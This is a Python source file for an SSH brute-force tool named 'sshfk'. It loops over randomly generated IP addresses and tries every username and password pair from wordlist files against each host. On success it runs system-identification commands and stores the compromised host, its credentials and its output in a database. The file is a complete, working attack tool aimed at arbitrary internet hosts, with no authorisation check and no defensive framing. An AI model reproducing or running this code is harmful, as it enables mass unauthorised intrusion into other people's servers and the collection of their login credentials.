import click
import paramiko
import sys
import socket
sys.path.append('./')
from db import DB
from ip import IP

@click.command()
@click.option('--users-file', prompt='usernames', help='File containing usernames.')
@click.option('--passwd-file', prompt='passwords', help='File containing passwords.')
@click.option('--port', prompt='port', help='ssh connection port.', default=22)
@click.option('--verbose/--no-verbose', default=True)
def sshfk(users_file, passwd_file, port, verbose):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    db = DB()
    while True:
        try:
            host = IP.generate_random()
            if db.exists_connection(host) is True:
                continue
            if verbose:
                click.echo('[*] Connecting to {}'.format(host))
            for username in read_file(users_file):
                for password in read_file(passwd_file):
                    try:
                        if verbose:
                            click.echo('[*] Using {} {}'.format(username, password))
                        ssh.connect(host, username=username.rstrip(), password=password.rstrip(), port=port, timeout=5, allow_agent=False, look_for_keys=False)
                        stdin, stdout, stderr=ssh.exec_command("uname -ar && cat /etc/issue")
                        db.save_ssh_connection(host=host, port=port, username=username, password=password, uname=stdout.read())
                        click.echo('[+] {} saved'.format(host))
                        raise StopIteration
                    except socket.timeout as e:
                        if verbose: 
                            click.echo('[-] Timeout - stop iteration')
                        raise StopIteration
                    except paramiko.ssh_exception.SSHException as e:
                        if verbose:
                            click.echo('[-] {}'.format('Unable to connect'))
                    except Exception as e:
                        if verbose:
                            click.echo('[-] {} - stop iteration'.format(e))
                        raise StopIteration

        except StopIteration as e:
            if verbose:
                click.echo('[/] Generating new host...')


    db.close()

def read_file(file):
    with open(file) as f:
        for line in f:
            yield line.rstrip()

if __name__ == '__main__':
    sshfk()
